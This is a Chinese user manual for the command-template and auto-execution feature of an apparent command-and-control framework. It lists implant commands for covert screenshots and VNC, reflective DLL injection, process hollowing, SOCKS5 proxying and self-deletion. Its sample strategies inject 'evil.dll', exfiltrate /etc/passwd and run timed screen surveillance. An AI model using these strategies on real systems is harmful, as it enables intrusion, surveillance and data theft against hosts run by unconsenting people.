# 自动编排策略 - 命令模板系统使用说明

## 概述

新的命令模板系统为自动编排的"策略管理"提供了一个更加用户友好的命令配置界面。用户现在可以通过下拉菜单选择预定义的命令,并通过表单界面输入参数,无需手动编写 JSON 格式的命令。

**✨ 最新更新**: 命令模板已与"客户端生成"模块的"命令功能选择"完全对齐,覆盖所有 Beacon 支持的命令!

## 主要特性

### 1. 灵活的命令输入方式
系统支持两种命令输入方式:

#### 方式一: 命令模板(推荐)
- 从下拉菜单选择预定义的命令
- 通过表单输入参数
- 适合常用命令和标准操作

#### 方式二: 自定义命令
- 手动输入任意命令字符串
- 支持所有 Beacon 命令
- 适合特殊命令或自定义脚本

### 2. 完整的命令模板库
系统内置了 **36 个命令模板**,与 Beacon 实际支持的命令完全对齐,按功能分类:

- **基础功能** (18个): pwd, ls, cd, cat, cp, mkdir, mkfile, rmdir, rmfile, shell, execute, spawn, getuid, sleep, exit, upload, download, filepath, switchprotocol
- **进程管理** (3个): ps, kill, pid2path
- **窃密模块** (2个): screenshot, vnc
- **高级后渗透** (11个): rdi, proc_hollow, load_module, show_module, exec_module, unload_module, cmd, socks5, interactive, inline_execute, selfdel
- **Linux专用** (2个): elf_loader, so_loader

### 3. 平台过滤
根据选择的目标平台(Windows/Linux/macOS/跨平台),系统自动过滤并显示适用于该平台的命令。

### 4. 可视化参数输入(模板命令)
- 每个命令模板都有定义好的参数
- 支持多种输入类型:
  - 文本输入: 用于路径、命令等
  - 数字输入: 用于进程ID、延迟时间等
  - 下拉选择: 用于预定义的选项
  - 复选框: 用于布尔选项
- 必填参数会自动标记(*)
- 实时命令预览

### 5. 智能命令生成
系统根据用户选择的命令和输入的参数,自动生成正确的命令字符串。

### 6. 参数验证
- 自动验证必填参数
- 验证参数类型和范围
- 提供清晰的错误提示

### 7. 命令帮助系统
- 点击"查看可用命令"按钮查看所有模板命令
- 每个命令都有详细说明和示例
- 可以直接从帮助中选择命令

## 使用流程

### 1. 创建策略
1. 点击"创建策略"按钮
2. 填写策略基本信息:
   - 策略名称
   - 目标平台(Windows/Linux/macOS/跨平台)
   - 策略描述
   - 策略分类
   - 优先级

### 2. 配置命令步骤

#### 使用命令模板(推荐):
1. 在"执行命令"部分,点击"添加步骤"
2. 从下拉菜单中选择"选择命令..."
3. 浏览分类并选择要执行的命令
4. 根据命令的参数配置要求,填写相应字段:
   - 必填参数会标记为红色 *
   - 可选参数可以留空
5. 实时查看命令预览
6. 可以为每个步骤设置延迟时间(秒)

#### 使用自定义命令:
1. 在"执行命令"部分,点击"添加步骤"
2. 从下拉菜单中选择"📝 自定义命令"
3. 在文本框中输入任意命令,例如:
   ```
   shell whoami /all
   shell curl -s https://example.com
   execute /usr/bin/python3 -c "print('hello')"
   ```
4. 实时查看命令预览
5. 可以点击右侧的"?"按钮查看所有可用命令模板
6. 可以为每个步骤设置延迟时间(秒)

### 3. 混合使用
您可以在同一个策略中混合使用模板命令和自定义命令:
- 步骤1: 使用模板命令 "hostname"
- 步骤2: 使用自定义命令 "shell my-custom-script.sh"
- 步骤3: 使用模板命令 "sleep" 延迟30秒
- 步骤4: 使用模板命令 "ps"

### 3. 配置触发条件(可选)
定义策略执行的条件,例如:
```json
[
  {
    "field": "status",
    "operator": "==",
    "value": "online"
  },
  {
    "field": "os",
    "operator": "contains",
    "value": "windows"
  }
]
```

### 4. 自动执行设置
- 勾选"Beacon上线时自动执行"
- 设置延迟时间(默认60秒)

### 5. 保存策略
点击"保存策略"按钮,系统会:
- 验证所有参数
- 生成最终的命令 JSON
- 保存到数据库

## 命令示例

### 示例 1: 使用基础功能模板 - 信息收集策略
```
平台: Linux
分类: 信息收集

命令步骤:
1. 查看当前目录(模板)
   - 类型: 命令模板
   - 命令: pwd
   - 延迟: 0秒

2. 列出文件(模板)
   - 类型: 命令模板
   - 命令: ls
   - 参数: -la
   - 延迟: 1秒

3. 获取用户ID(模板)
   - 类型: 命令模板
   - 命令: getuid
   - 延迟: 2秒

4. 查看进程(模板)
   - 类型: 命令模板
   - 命令: ps
   - 参数: aux
   - 延迟: 3秒
```

### 示例 2: 混合使用 - Windows 监控策略
```
平台: Windows
分类: 监控

命令步骤:
1. 获取权限信息(模板)
   - 类型: 命令模板
   - 命令: getuid
   - 延迟: 0秒

2. 执行自定义脚本(自定义)
   - 类型: 自定义命令
   - 命令: shell C:\monitoring\check.ps1
   - 延迟: 2秒

3. 等待30秒(模板)
   - 类型: 命令模板
   - 命令: sleep
   - 秒数: 30
   - 延迟: 0秒

4. 截图(模板)
   - 类型: 命令模板
   - 命令: screenshot
   - 延迟: 5秒
```

### 示例 3: 高级后渗透 - DLL注入策略
```
平台: Windows
分类: 高级后渗透

命令步骤:
1. 查找目标进程(自定义)
   - 类型: 自定义命令
   - 命令: shell tasklist | findstr notepad.exe
   - 延迟: 0秒

2. DLL注入(模板)
   - 类型: 命令模板
   - 命令: rdi
   - DLL路径: C:\payload\evil.dll
   - 目标进程ID: [从步骤1获取]
   - 延迟: 2秒

3. 加载模块(模板)
   - 类型: 命令模板
   - 命令: load_module
   - 模块路径: C:\modules\post_ex.dll
   - 延迟: 5秒
```

### 示例 4: 完全自定义 - 复杂侦察策略
```
平台: 跨平台
分类: 侦察

命令步骤:
1. 执行自定义侦察(自定义)
   - 类型: 自定义命令
   - 命令: shell python3 -c "import socket; print(socket.gethostname())"
   - 延迟: 0秒

2. 等待5秒(自定义)
   - 类型: 自定义命令
   - 命令: shell ping -c 2 127.0.0.1 > /dev/null
   - 延迟: 0秒

3. 检查网络(自定义)
   - 类型: 自定义命令
   - 命令: shell netstat -tuln | grep LISTEN
   - 延迟: 2秒
```

### 示例 5: 窃密模块 - 屏幕监控策略
```
平台: 跨平台
分类: 窃密

命令步骤:
1. 等待用户活动(模板)
   - 类型: 命令模板
   - 命令: sleep
   - 秒数: 60
   - 延迟: 0秒

2. 屏幕截图(模板)
   - 类型: 命令模板
   - 命令: screenshot
   - 延迟: 0秒

3. 等待30秒(模板)
   - 类型: 命令模板
   - 命令: sleep
   - 秒数: 30
   - 延迟: 0秒

4. 再次截图(模板)
   - 类型: 命令模板
   - 命令: screenshot
   - 延迟: 0秒
```

### 示例 6: 文件操作 - 文件传输策略
```
平台: Linux
分类: 文件传输

命令步骤:
1. 查看当前目录(模板)
   - 类型: 命令模板
   - 命令: pwd
   - 延迟: 0秒

2. 创建临时目录(模板)
   - 类型: 命令模板
   - 命令: mkdir
   - 目录路径: /tmp/transfer
   - 延迟: 1秒

3. 下载文件到服务器(模板)
   - 类型: 命令模板
   - 命令: download
   - 远程路径: /etc/passwd
   - 本地保存路径: /tmp/transfer/passwd.bak
   - 延迟: 2秒
```

## 高级功能

### 1. 切换到 JSON 高级编辑
如果需要使用系统未预定义的命令,可以:
1. 点击"切换到 JSON 高级编辑"按钮
2. 直接编辑命令 JSON 格式
3. 手动输入自定义命令和参数

### 2. 命令参数组合
某些命令支持多个参数:
```
命令: cat
文件路径: /etc/passwd
```

生成的命令: `cat /etc/passwd`

### 3. 延迟设置
每个命令步骤可以设置独立的延迟时间,单位为秒。这允许在命令之间创建时间间隔。

## 注意事项

### 使用命令模板时
1. **平台兼容性**: 确保选择的命令适用于目标平台
2. **参数验证**: 保存前系统会验证所有必填参数
3. **命令顺序**: 命令按照添加的顺序依次执行
4. **错误处理**: 如果某个命令执行失败,后续命令仍会继续执行
5. **权限要求**: 某些命令可能需要特定的权限级别

### 使用自定义命令时
1. **命令格式**: 确保命令格式正确,包括必要的引号和转义
2. **平台差异**: 注意不同平台的命令差异:
   - Windows: 使用 `shell command` 或直接输入命令
   - Linux/macOS: 使用 `shell command` 执行Shell命令
3. **复杂命令**: 对于复杂的Shell命令,建议使用引号包裹:
   ```
   shell "python -c 'print(\"hello\")'"
   shell "curl -s https://example.com | grep pattern"
   ```
4. **命令历史**: 自定义命令不会自动保存为模板,每次需要重新输入
5. **错误处理**: 自定义命令的错误需要手动检查输出,系统不会验证命令语法
6. **权限提升**: 如需要管理员权限,确保Beacon已提升权限

### 混合使用时
1. **一致性**: 确保不同步骤之间的命令是逻辑连贯的
2. **依赖关系**: 注意步骤之间的依赖关系,合理设置延迟
3. **平台适配**: 跨平台策略时,避免使用平台特定的命令(如 ipconfig vs ifconfig)

## 技术细节

### 数据格式
系统最终生成的命令格式:
```json
[
  {
    "type": "command",
    "command": "systeminfo",
    "parameters": {},
    "delay": 0
  },
  {
    "type": "command",
    "command": "whoami /all",
    "parameters": {},
    "delay": 2
  }
]
```

### 命令模板扩展
要添加新的命令模板,编辑 `static/command_templates.js` 文件:

```javascript
'mycommand': {
    name: 'MyCommand',
    category: '分类',
    description: '命令描述',
    icon: 'fa-icon',
    platforms: ['windows', 'linux', 'macos'],
    template: 'mycommand',
    parameters: [
        {
            name: 'param1',
            label: '参数1',
            type: 'text',
            required: true,
            placeholder: '提示文本'
        }
    ],
    examples: ['mycommand arg1', 'mycommand arg1 arg2']
}
```

## 常见问题

**Q: 如何在模板命令和自定义命令之间切换?**
A: 在命令下拉框中选择"📝 自定义命令"或具体的模板命令。可以随时切换。

**Q: 如何执行自定义的 Shell 命令?**
A: 选择"📝 自定义命令",在输入框中输入命令,例如:
- `shell whoami /all`
- `shell python3 -c "print('hello')"`
- `shell curl -s https://example.com`

**Q: 如何查看所有可用的命令模板?**
A: 在自定义命令输入框右侧点击"?"按钮,会显示所有可用的命令模板及其说明。

**Q: 自定义命令支持哪些格式?**
A: 支持任何 Beacon 原生命令和 Shell 命令:
- Beacon命令: `pwd`, `ls`, `cat`, `ps` 等
- Shell命令: `shell systeminfo`, `shell whoami`, `shell python script.py`

**Q: 如何在 Linux 和 Windows 上使用相同的策略?**
A:
1. 选择平台为"跨平台"
2. 使用通用命令(如 shell, pwd, cd)
3. 或者使用自定义命令配合条件判断:
   ```
   shell if [ "$(uname)" = "Linux" ]; then echo "Linux"; else echo "Windows"; fi
   ```

**Q: 命令执行失败怎么办?**
A: 查看执行记录中的错误信息,检查:
- 命令参数是否正确
- 是否有足够的权限
- 文件路径是否存在
- 自定义命令的语法是否正确

**Q: 如何调试命令?**
A:
1. 可以先在单个 Beacon 上手动测试命令
2. 确认无误后再添加到策略中
3. 查看执行记录中的详细输出
4. 使用延迟步骤来观察中间结果

**Q: 能否在自定义命令中使用变量?**
A: 可以,但需要在 Shell 命令中处理:
```
shell "MYVAR=value; echo $MYVAR"
```
注意策略本身不支持变量插值。

**Q: 如何将自定义命令保存为模板?**
A: 当前版本需要编辑 `command_templates.js` 文件来添加新模板。查看文档末尾的"命令模板扩展"部分。

**Q: 自定义命令支持管道(|)和重定向吗?**
A: 支持,在 shell 命令中:
```
shell cat file.txt | grep pattern
shell command > output.txt 2>&1
```

## 更新日志

### v2.2 - 2026-02-02
- ✅ 命令模板与"客户端生成"模块完全对齐
- ✅ 新增36个完整命令模板,覆盖所有Beacon功能
- ✅ 按照客户端生成模块的分类组织命令(基础功能/进程管理/窃密模块/高级后渗透/Linux专用)
- ✅ 更新所有示例以使用对齐后的命令
- ✅ 移除不存在的命令(如systeminfo, whoami等系统命令,这些应通过shell执行)
- ✅ 添加Beacon高级功能模块(rdi, proc_hollow, load_module等)
- ✅ 添加窃密模块(screenshot, vnc)

## 命令对照表

| 分类 | 客户端生成模块 | 自动编排模块 | 说明 |
|------|---------------|---------------|------|
| **基础功能** | | | |
| | pwd | pwd | 获取当前目录 |
| | ls | ls | 列出目录内容 |
| | cd | cd | 切换工作目录 |
| | cat | cat | 查看文件内容 |
| | cp | cp | 复制文件 |
| | mkdir | mkdir | 创建目录 |
| | mkfile | mkfile | 创建文件 |
| | rmdir | rmdir | 删除目录 |
| | rmfile | rmfile | 删除文件 |
| | shell | shell | 执行Shell命令 |
| | execute | execute | 执行程序 |
| | spawn | spawn | 生成新Beacon进程 |
| | getuid | getuid | 获取用户ID和权限 |
| | sleep | sleep | 休眠指定时间 |
| | exit | exit | 退出Beacon |
| | upload | upload | 上传文件到Beacon |
| | download | download | 从Beacon下载文件 |
| | filepath | filepath | 获取Beacon可执行文件路径 |
| | switchprotocol | switchprotocol | 切换通信协议 |
| **进程管理** | | | |
| | ps | ps | 查看进程列表 |
| | kill | kill | 终止进程 |
| | pid2path | pid2path | 根据进程ID查找路径 |
| **窃密模块** | | | |
| | screenshot | screenshot | 屏幕截图 |
| | vnc | vnc | 远程桌面控制(VNC) |
| **高级后渗透** | | | |
| | rdi | rdi | 反射式DLL注入 |
| | proc_hollow | proc_hollow | 进程镂空技术 |
| | load_module | load_module | 加载Beacon模块 |
| | show_module | show_module | 显示已加载的模块列表 |
| | exec_module | exec_module | 执行模块功能 |
| | unload_module | unload_module | 卸载Beacon模块 |
| | cmd | cmd | 执行CMD命令(Windows) |
| | socks5 | socks5 | 启动SOCKS5代理 |
| | interactive | interactive | 启动交互式Shell |
| | inline_execute | inline_execute | 内存中执行PE文件 |
| | selfdel | selfdel | 自删除Beacon文件 |
| **Linux专用** | | | |
| | elf_loader | elf_loader | ELF文件加载器 |
| | so_loader | so_loader | SO插件加载器(类BOF) |

### 重要说明

1. **命令对应关系**: 自动编排模块的命令模板与客户端生成模块的"命令功能选择"完全一致
2. **系统命令**: 如需执行系统命令(systeminfo, whoami, netstat等),请使用`shell`命令:
   - 正确: `shell whoami`
   - 正确: `shell netstat -an`
   - 错误: 直接选择不存在的命令
3. **分类对齐**: 两个模块使用完全相同的5大分类体系
4. **完整覆盖**: 所有36个Beacon支持的命令都已包含在自动编排模板中

### v2.1 - 2026-02-02
- ✅ 支持自定义命令输入
- ✅ 添加命令帮助系统,可查看所有可用模板
- ✅ 支持模板命令和自定义命令混合使用
- ✅ 改进命令选择体验,默认使用自定义命令
- ✅ 增强文档,添加自定义命令使用指南和示例

### v2.0 - 2026-02-02
- 新增命令模板系统
- 支持可视化参数输入
- 添加实时命令预览
- 实现平台命令过滤
- 改进参数验证
